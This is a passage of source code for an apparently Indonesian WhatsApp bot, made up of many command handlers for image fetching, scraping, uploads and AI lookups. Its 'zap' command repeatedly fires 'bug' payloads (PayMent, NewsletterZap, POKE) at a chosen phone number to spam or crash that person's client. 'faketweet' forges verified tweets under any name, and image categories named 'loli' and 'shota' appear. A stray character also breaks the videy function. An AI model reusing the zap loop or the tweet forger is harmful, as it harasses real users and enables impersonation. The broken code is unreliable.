if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kagachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/spacee/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)];
ptz.sendMessage(m.chat, { image: { url: yeha }, caption : mess.done }, { quoted: m })
}
break

case 'faketweet':{
const canvafy = require('canvafy')
if (!text) return reply(`Exmaple : Name1 | Name2 | Text`)
 nama1 = text.split("|")[0]
 nama2 = text.split("|")[1]
 katakata = text.split("|")[2]
const tweet = await new canvafy.Tweet()
 .setTheme("dim")
 .setUser({displayName: nama1, username: nama2})
 .setVerified(true)
 .setComment(katakata)
 .setAvatar(ppuser)
 .build();
 let tanaka = tweet
 ptz.sendMessage(m.chat, { image: tanaka, caption: 'Done Desuu~' },{ quoted : m }) 
}
break

case 'topdoujin':{
async function topDoujin(type = 'doujin') {
 return new Promise((resolve, reject) => {
 axios.get('https://myanimelist.net/topmanga.php?type='+type)
 .then(({ data }) => {
 let $ = cheerio.load(data)
 let hasil = []
 $('tr.ranking-list').each(function (a, b) {
 hasil.push({
 rank: $(b).find('td.rank.ac > span').text(),
 title: $(b).find('td.title.al.va-t.clearfix.word-break > div > h3').text(),
 info: $(b).find('td.title.al.va-t.clearfix.word-break > div > div.information.di-ib.mt4').text().trim(),
 rating: $(b).find('td.score.ac.fs14 > div').text(),
 detail: $(b).find('td.title.al.va-t.clearfix.word-break > div > h3 > a').attr('href'),
 image: $(b).find('td.title.al.va-t.clearfix.word-break > a > img').attr('data-src') || $(b).find('td.title.al.va-t.clearfix.word-break > a > img').attr('src')
 })
 })
 resolve(hasil)
 })
 })
}
reply('wait a minute...')
let results = await topDoujin()
if (results.length > 0) {
let message = '*TOP DOUJIN BULAN INI*\n\n';
results.forEach((result, index) => {
message += `${result.rank}. *${result.title}*\n- Score: ${result.rating}\n- Info: ${result.info}\n- Link: ${result.detail}\n\n`;
 });
 await reply(message)
 } else {
m.reply('Tidak Ada Hasil.');
}
}
break

case'antilink':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !isPrem) return reply('Fitur Khusus admin!')
if (!isBotAdmins) return reply(mess.BotAdmin)
if (args[0] === "on") {
if (isAntiLink) return reply(`Udah aktif`)
antilink.push(m.chat)
fs.writeFileSync('./antimenu/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Activate Antilink In This Group')
} else if (args[0] === "off") {
if (!isAntiLink) return reply(`Udah nonaktif`)
let anu = antilink.indexOf(m.chat)
antilink.splice(anu, 1)
fs.writeFileSync('./antimenu/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Disabling Antilink In This Group')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'antilink2':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !isPrem) return reply('Fitur Khusus admin!')
if (!isBotAdmins) return reply('bot hrs jadi atmin')
if (args[0] === "on") {
if (isAntiLink2) return reply(`Udah aktif`)
antilink2.push(m.chat)
fs.writeFileSync('./antimenu/antilink2.json', JSON.stringify(antilink2, null, 2))
reply('Successfully Activate antilink2 In This Group')
} else if (args[0] === "off") {
if (!isAntiLink2) return reply(`Udah nonaktif`)
let anu = antilink2.indexOf(m.chat)
antilink2.splice(anu, 1)
fs.writeFileSync('./antimenu/antilink2.json', JSON.stringify(antilink2, null, 2))
reply('Successfully Disabling antilink2 In This Group')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break

case 'idch': case 'idchannel': {
if (!isPrem) return reply(mess.owner)
if (!m.quoted) return reply('reply saluran channel nya')
try {
let id = (await m.getQuotedObj()).msg.contextInfo.forwardedNewsletterMessageInfo 
let send_ch = `*BERIKUT DATA CHANNEL ANDA*\n
*Name Channel*: ${id.newsletterName}\n*ID Channel*: ${id.newsletterJid}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: send_ch
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"ID CHANNEL\",\"id\":\"123456789\",\"copy_code\":\"${id.newsletterJid}\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await ptz. relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
});
} catch (e) {
reply('Harus chat dari channel bang') 
}
}
break

case 'getpp':{
if (!isPrem) return
if (!text) return m.reply(`Example: ${prefix + command} [Tag Orang]`)
try {
let who
	if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.sender;
	else who = `${text}`
	let url = await ptz.profilePictureUrl(who, "image");
	await ptz.sendFile(
		m.chat,
		url,
		"profile.jpg",
		`@${who.split`@`[0]}`,
		m,
		null,
		{ mentions: [who] }
	)}catch (error) {
m.reply(`Tidak Dapat Mengambil Foto Profile`);
 }
}
break

case 'npms':{
	if (!text) return m.reply('Input Query')
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	let { objects } = await res.json()
	if (!objects.length) throw `Query "${text}" not found :/`
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
	m.reply(txt)
}
break
case 'nextlibur': {
 m.reply(mess.wait)
 async function nexLibur() {
 const { data } = await axios.get("https://www.liburnasional.com/");
 let libnas_content = [];
 let $ = cheerio.load(data);
 let result = {
 nextLibur:
 "Hari libur" +
 $("div.row.row-alert > div").text().split("Hari libur")[1].trim(),
 libnas_content,
 };
 $("tbody > tr > td > span > div").each(function (a, b) {
 let summary = $(b).find("span > strong > a").text();
 let days = $(b).find("div.libnas-calendar-holiday-weekday").text();
 let dateMonth = $(b).find("time.libnas-calendar-holiday-datemonth").text();
 libnas_content.push({ summary, days, dateMonth });
 });
 return result;
 }
 try {
 let teks = `*${(await nexLibur()).nextLibur}*\n\n`
 let result = (await nexLibur()).libnas_content

 for (let a of result) {
 teks += `Ringkasan: ${a.summary}\nHari: ${a.days}\nBulan: ${a.dateMonth}\n\n`
 }
 reply(teks)
 } catch (e) {
 throw e
 }
}
break
case 'lahelu': {
	let tags = ['lucu', 'relate', 'gaming', 'nostalgia', 'teknologi', 'random', 'komik', 'editan', 'wtf', 'olahraga', 'opini', 'dark', 'absurd', 'cringe', 'sus', 'binatang']
	if(text && !tags.includes(text)) return m.reply(`Meme "${text}" tidak di temukan! \n\n${tags.map(v => `- ${v}`).join('\n')}`) 
	let url;
	let page = Math.round(Math.random() * 25)
	if(!text) url = `https://lahelu.com/api/post/get-posts?feed=1&page=${page}`
	if(text) url = `https://lahelu.com/api/post/get-posts?feed=1&hashtags[]=${text}&page=${page}`
	let anu = (await axios.get(url)).data
	let data = anu.postInfos[Math.floor(Math.random() * anu.postInfos.length)]
	if(/^video/i.test(data.media)) return await ptz.sendMessage(m.chat, { video: { url: 'https://cache.lahelu.com/'+data.media }, caption: data.title, viewOnce: true }, { quoted: m }) 
	if(/^image/i.test(data.media)) return await ptz.sendMessage(m.chat, { image: { url: 'https://cache.lahelu.com/'+data.media }, caption: data.title, viewOnce: true }, { quoted: m }) 
	}
break

case 'videy2' : {
if (!args[0]) {
 return m.reply(`• Contoh: ${prefix + command} https://videy.co/v?id=K7wdQnbm`);
 }
async function videy(url) {
	return new Promise(async (resolve, reject) => {
		try {
			const res = await axios(`${url}`, { method: 'get' });
			const $ = cheerio.load(res.data);
			const video = $('source[type="video/mp4"]').attr('src');
			if (video) {
				resolve(video);
			} else {
				throw new Error('Video source not found');
			}
		} catch (error) {
			reject(`Error while fetching the URL: ${error.message}`);
h		}
	});
}
 if (!/^http(s):\/\/videy\.co/i.test(args[0])) {
 return m.reply('Link Invalid');
 }

 try {
 let result = await videy(args[0]);
 await ptz.sendMessage(m.chat, { video: { url: result }, caption: "Done" }, { quoted: m });
 } catch (error) {
 console.log(error);
 throw new Error(error);
 }
}
break
case "tourl": {
				if (!isPrem) return reply(mess.premium)
				if (!/video/.test(mime) && !/image/.test(mime)) return reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
				if (!quoted) return reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
				let q = m.quoted ? m.quoted : m
				ptz.sendMessage(m.chat, {
					react: {
						text: '〽️',
						key: m.key
					}
				});
				let media = await q.download()
				let uploadImage = require('./lib/system/uploadImage')
				let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
				let link = await (isTele ? uploadImage : uploadFile)(media)
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.idch,
										newsletterName: global.ownername,
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: ptz.decodeJid(ptz.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: link
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: packname + ownername,
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `Hiii, @${m.sender.split("@")[0]} Here Is Your CatBox.Link!\n`,
									subtitle: global.botname,
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										image: {
											url: `${link}`
										}
									}, {
										upload: ptz.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
										"name": "cta_copy",
										"buttonParamsJson": `{\"display_text\":\"Copy Url\",\"id\":\"123456789\",\"copy_code\":\"${link}\"}`
									}, ],
								})
							})
						}
					}
				}, {})

				await ptz.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				}, {
					quoted: m
				})

			}
			break
			case "tourlvid": {
				if (!isPrem) return reply(mess.premium)
				if (!/video/.test(mime) && !/image/.test(mime)) return reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
				if (!quoted) return reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
				let q = m.quoted ? m.quoted : m
				ptz.sendMessage(m.chat, {
					react: {
						text: '〽️',
						key: m.key
					}
				});
				let media = await q.download()
				let uploadImage = require('./lib/system/uploadImage')
				let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
				let link = await (isTele ? uploadImage : uploadFile)(media)
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.idch,
										newsletterName: '𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: ptz.decodeJid(ptz.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: link
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: packname + ownername,
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `Hiii, @${m.sender.split("@")[0]} Here Is Your CatBox.Link!\n`,
									subtitle: global.botname,
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										video: {
											url: `${link}`
										}
									}, {
										upload: ptz.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
										"name": "cta_copy",
										"buttonParamsJson": `{\"display_text\":\"Copy Url\",\"id\":\"123456789\",\"copy_code\":\"${link}\"}`
									}, ],
								})
							})
						}
					}
				}, {})

				await ptz.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				}, {
					quoted: m
				})

			}
			break
case "chwa": {
if (!text) return m.reply("Mana linknya?")
try {
 var { data } = await require("axios").get("https://manaxu-seven.vercel.app/api/others/chwa?query=" + text)
 var { name, follower, description } = data.result
 var x = `*Name:* ${name}\n*Followers:* ${follower}\n*Description:* ${description}`
 reply(x)
} catch (e) {
return m.reply("fitur eror")
}
}
break

case 'tourll': case 'tourlugu': {
if (!isMedia) return m.reply(`Kirim vidio/gambar dengan caption ${prefix+command}`)
let media = await ptz.downloadAndSaveMediaMessage(quoted);
ptz.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
if (/image/.test(mime)) {
/*let anu = await TelegraPH(media);
m.reply(`Link: ${anu}`);
} if (/video/.test(mime)) {
let anu = await TelegraPH(media);
m.reply(`Link: ${anu}`);
} else if (!/image/.test(mime)) {*/
let anu = await UploadFileUgu(media);
    //let anu = await uploadToCatboxx(media);
reply(`*Link*: ${anu.url}\n*Expired*: no expired!!`);
}
await fs.unlinkSync(media);
}
break

case 'spotifys':
case 'spotifysearch': {
if (!text) return m.reply(`Contoh: ${prefix+command} aku yang tersakiti`)
let anu = await searchSpotifyTracks(text);
let anuu = anu[0]
const spotify = await fetchJson(`https://api.vreden.my.id/api/spotify?url=${anuu.external_urls.spotify}`)
await ptz.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
let teks = `SPOTIFY - SEARCH\n\n`;
for (let x of anu) {
teks += `• Title: ${x.name}\n`;
teks += `• Artis: ${x.artists.map(v => v.name).join(', ')}\n`;
teks += `• Link: ${x.external_urls.spotify}\n\n\n`;
}
ptz.sendMessage(m.chat, {image: {url: spotify.result.image }, caption: teks }, {quoted:m})
await ptz.sendMessage(m.chat, {audio: { url: spotify.result.download }, mimetype: 'audio/mpeg' },{ quoted: m })
}
break

case 'spotifys2': case 'spotifysearch2': {
if (!text) return m.reply('❌ *Spotify Search* ❌\n\nSilakan masukkan kata kunci untuk mencari lagu di Spotify.')
 try {
 do2 = await searchSpotifyTracks(text)
let ini_text = '✨ *Spotify Search* ✨';
for (const x of do2) {
ini_text += `\n
 •🎵 *Judul:* ${x.name}
👥 *Artis:* ${x.artists.map(v => v.name).join(', ')}
👥 *Artis Album:* ${x.album.artists.map(v => v.name).join(', ')}
🆔 *ID:* ${x.id}
📅 *Tanggal Rilis Album:* ${x.album.release_date}
🆔 *ID Album:* ${x.album.id}
🎵 *Jumlah Trek Album:* ${x.album.total_tracks}
🔢 *Nomor Trek:* ${x.album.track_number}
⏳ *Durasi:* ${x.duration_ms} ms
🔗 *Uri:* ${x.uri}
🎵 *URL Album*: ${x.album.external_urls.spotify}\n
───────────────────
`;
}
reply(ini_text)
} catch (e) {
 return m.reply('❌ *Spotify Search* ❌\n\nTerjadi Kesalahan, Coba Lagi Nanti.')
 }
 }
break

case 'aiku': {
	let xtxt = args[0]
if (!text) return reply(`☘️ *Mau Nanya Apa Sama Ai?*`)
if (text.length > 500) return reply(`☘️ *Maksimal 500 Karakter*`)
reply('☘️ *Sabar Yaa*')
let Kon = await fetchJson(`https://rest-api-free.vercel.app/luminai?text=${xtxt}`);
let lenai = Kon.data
await reply(lenai)
}
break

case 'lapor': case 'req': case 'reqfitur': case 'saran':{
let lenwy_txt = args[0]
if (!text) return reply('☘️ *Mana Teksnya?*')
if (text.length > 30) return reply(`☘️ *Maksimal 30 Karakter*`) 
reply('☘️ *Saran Berhasil Terkirim, Terimakasih*')
ptz.sendMessage(`${global.idch}`, { text: `📦 *Saran / Masukan*\n🎁 *Dari :* @${m.sender.split('@')[0]}\n📃 *Pesan :* ${text}\n\n 📣 *Saran Ini Dikirim Oleh Bot*`, mentions: [m.sender]}, { quoted: m })
}
break

case 'reportbug':{
let lenwy_txt = args[0]
if (!text) return reply('☘️ *Mana Teksnya?*')
if (text.length > 15) return reply(`☘️ *Maksimal 15 Karakter*`) 
reply('⚠️ *Report Berhasil Terkirim, Terimakasih*')
ptz.sendMessage(`${global.idch}`, { text: `⚠️ *Report Bug*\n🎁 *Dari :* @${m.sender.split('@')[0]}\n📃 *Pesan :* ${text}\n\n 📣 *Laporan Ini Dikirim Oleh Bot*`, mentions: [m.sender]}, { quoted: m })
}
break
case 'you': case 'yousearch': {
 let input = `Ex : ${prefix + command} Siapakah Presiden Indonesia Sekarang`

 if (!text) return m.reply(input)
 const website = axios.create({
 baseURL: "https://app.yoursearch.ai",
 headers: {
 "Content-Type": "application/json",
 },
});

const yousearch = async (searchTerm) => {
 const requestData = {
 searchTerm: searchTerm,
 promptTemplate: `Search term: "${searchTerm}"

Make your language less formal and use emoticons.
I want you to always use Indonesian slang from Jakarta where the words "you" and "anda" are replaced with "lu" and the word I is replaced with "gw".
Create a summary of the search results in three paragraphs with reference numbers, which you then list numbered at the bottom.
Include emojis in the summary.
Be sure to include the reference numbers in the summary.
Both in the text of the summary and in the reference list, the reference numbers should look like this: "(1)".
Formulate simple sentences.
Include blank lines between the paragraphs.
Do not reply with an introduction, but start directly with the summary.
Include emojis in the summary.
At the end write a hint text where I can find search results as comparison with the above search term with a link to Google search in this format \`See Google results: \` and append the link.
Below write a tip how I can optimize the search results for my search query.
I show you in which format this should be structured:

\`\`\`
<Summary of search results with reference numbers>

Sources:
(1) <URL of the first reference>
(2) <URL of the second reference>

<Hint text for further search results with Google link>
<Tip>
\`\`\`

Here are the search results:
{searchResults}`,
 searchParameters: "{}",
 searchResultTemplate: `[{order}] "{snippet}"
URL: {link}`,
 };

 try {
 const response = await website.post("/api", requestData);
 return response.data.response;
 } catch (error) {
 console.error("Error:", error);
 throw error;
 }
};

let hanjing = await yousearch(text)
reply(`${hanjing}`)
}
break
case "zap": {
				//if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPrem) return reply(mess.premium)
				//if (input.length == 0) return reply("_Reply/Tag/Nomer_")
	            if (!text) return reply('tag/awali dengan 62')
				const failed = []
				const count = text.split("|")[1]
				if (!count)
					return reply(`*Syntax Error!*\n\n_Use : Zap No|Amount Spam_\n_Example : Zap 62xx|1_\n\n\n_~Amount Spam~_\n1 = 100×\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				if (isNaN(count)) return reply("Hanya Bisa Angka!!")
				if (Number(count) < 1) return reply("Minimal 1")
				await reply(mess.bugrespon)
				for (const x of input) {
					if ((await ptz.onWhatsApp(x)).length > 0 &&
						!isCreator.includes(x.split("@")[0]) &&
						!isPrem.includes(x.split("@")[0]) &&
						x.split("@")[0] !== Creator &&
						x !== botNumber) {
						for (let j = 0; j < (Number(count) * 100); j++) {
							await PayMent(x)
							await NewsletterZap(x)
							await POKE(x)
						}
					} else {
						failed.push(x)
					}
				}
				const successList = input.filter(x => !failed.includes(x))
				const failedList = input.filter(x => failed.includes(x))
				if (successList.length > 0 && failedList.length > 0) {
					await reply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						successList.map(x => "@" + x.split("@")[0]).join(" ") +
						"\n\n𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						failedList.map(x => "@" + x.split("@")[0]).join(" "))
				} else if (successList.length > 0) {
					await reply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						successList.map(x => "@" + x.split("@")[0]).join(" "))
				} else if (failedList.length > 0) {
					await reply("𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						failedList.map(x => "@" + x.split("@")[0]).join(" "))
				}
			}
			break

case "public":
 if (!isCreator) return 
 ptz.public = true 
 reply("Succes Switch to public")
 break
 
 case "self":
 if (!isCreator) return
 if (!isPrem) return 
 ptz.public = false
 reply("Succes Switch to self")
 break

case 'jadinyata':
case 'toreal': {
 //if (!text) return reply(`Fotonya Mana?`);
 if (!/image/.test(mime)) return reply(`Kirim/Balas Foto dengan Caption ${prefix + command}`);
 reply(mess.wait);
 let tryng = 0;
//let uploadImage = require('./lib/system/uploadImage')
 const media = await ptz.downloadAndSaveMediaMessage(quoted)
	let meDia = fs.readFileSync(media);
 //let uploadImage2 = require('./lib/system/uploadImage')
 let pok = await uploadImage2(meDia);
 try {
 let ai = await fetch(`https://ai.xterm.codes/api/img2img/filters?action=anime2real&url=${pok}&key=${API.XTREM}`).then(a => a.json());
 if (!ai.status) return ai;
 console.log(ai);
 while (tryng < 55) {
 let s = await fetch(`https://ai.xterm.codes/api/img2img/filters/batchProgress?id=${ai.id}`).then(a => a.json());
 if (s.status === 1) {
 console.log("Starting...");
 } 
 if (s.status === 2) {
 console.log("Processing...");
 } 
 if (s.status == 3) {
 return ptz.sendMessage(m.chat, { image: { url: s.url } }, { quoted: m });
 }
 if (s.status == 4) {
 return reply("Maaf terjadi kesalahan. Coba gunakan gambar lain!");
 }
 await new Promise(resolve => setTimeout(resolve, 2000));
 }
 } catch (e) {
 console.error(e);
 reply(`Type-Err! :\n${e}`);
 }
}
break

/*case 'jadinyata':
case 'toreal': {
 if (!text) return reply(`Fotonya Mana?`);
 if (!/image/.test(mime)) return reply(`Kirim/Balas Foto dengan Caption ${prefix + command}`);
 reply(mess.wait);
 let tryng = 0;
let uploadImage = require('./lib/system/uploadImage')
 const media = await ptz.downloadAndSaveMediaMessage(quoted);
 let pok = await uploadImage(media);
 try {
 let ai = await fetch(`https://ai.xterm.codes/api/img2img/filters?action=anime2real&url=${pok}&key=OPSIONAL`).then(a => a.json());
 if (!ai.status) return ai;
 console.log(ai);
